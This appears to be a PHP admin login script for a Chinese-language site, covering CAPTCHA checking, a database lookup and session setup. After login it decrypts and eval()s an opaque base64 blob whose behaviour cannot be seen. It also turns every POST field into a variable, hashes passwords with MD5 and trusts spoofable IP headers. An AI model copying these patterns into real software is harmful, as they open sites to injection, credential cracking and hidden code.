<?php session_start(); ?>
<?php

    include('../mysql.php');
    require_once ('../MysqliDb.php');
    include_once('../securimage/securimage.php');
    include('./key.inc.php');

    $ip = getenv('HTTP_CLIENT_IP')?:
    getenv('HTTP_X_FORWARDED_FOR')?:
    getenv('HTTP_X_FORWARDED')?:
    getenv('HTTP_FORWARDED_FOR')?:
    getenv('HTTP_FORWARDED')?:
    getenv('REMOTE_ADDR');

    if (!ip2long($ip)){
        header('Location:https://google.com');
    }


    $db = new MysqliDb($mysqli);

    $securimage = new Securimage();

    if ($securimage->check($_POST['captcha_code']) == false) {
      echo '<h1>圖形驗證碼錯誤!</h1>';
      echo '<meta http-equiv=REFRESH CONTENT=1;url=login.php>';
      exit();
    }

    if (empty($_POST['account']) || empty($_POST['password'])){
       echo '<h1>帳號或密碼錯誤!</h1>';
       echo '<meta http-equiv=REFRESH CONTENT=1;url=login.php>';
       exit();
    }

    

    foreach($_POST as $k=>$v){
    	$$k = $mysqli->real_escape_string($v);
    }

    $admin = $db->where('admin_name', $account)->where('password', md5($password))->getOne('admins');

    if ($db->count > 0){
    	$_SESSION['bee_admin'] = $admin['id'];
    	$_SESSION['bee_admin_name'] = $admin['admin_name'];

        $system    =  $db->getOne('system');

        if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
        if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
        if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
        if(file_exists('key.inc.php')){include_once('key.inc.php');}else{die('<h2>File key.inc.php not found !</h2>');}
        $e7091="UFpNV2pXdWwyT0EyWURyb21FMG93UG5ML1R6MGZPT0w2UW91UDM3TzhuQjI1VzRCUytqVUgzM1Q3OHgvZVZKR2NBRG9UaUtuUHRTSFdYWG5RM29tM2xRZ1hpMm05dzJ2Lzd6UEFMSW9hZ2ZjMnZKeW5EZmJZTDA4SkdZRVJVQzVkYzlDSldwSGlYdHVCYlNIbkc3LzNmbTl4eFJyUFpIWmZheDlOMjRJZTE3K0NlQkhISmM0WG9rajZvZ091WVcxQzAzeWlvMHFUUkJhakZVam9Mcm1wbDUrRWZFL1FuTGhkcCtXVVJ4REVTcUxBNzFway9HTnRrM2VPQ0dCTDhhcnpVUmFMd1ZrR3loVk9sa2JEY00ra1NsMDdnMnpKQ253cDVHMHc2bnJmUkt2eVFwOVpBN2x1WXZJUUpjendiZXhKdTAyL09aY2Jobnh1L203amJVRWk1R2tMUFRLNVE4d3dLdXdnZkp4T1FRPQ==";eval(e7061($e7091));
        
    	echo '<meta http-equiv=REFRESH CONTENT=1;url=main_nav.php>';
    } else {
    	echo '<h1>帳號或密碼錯誤~!</h1>';
    	echo '<meta http-equiv=REFRESH CONTENT=1;url=login.php>';
    } 

?>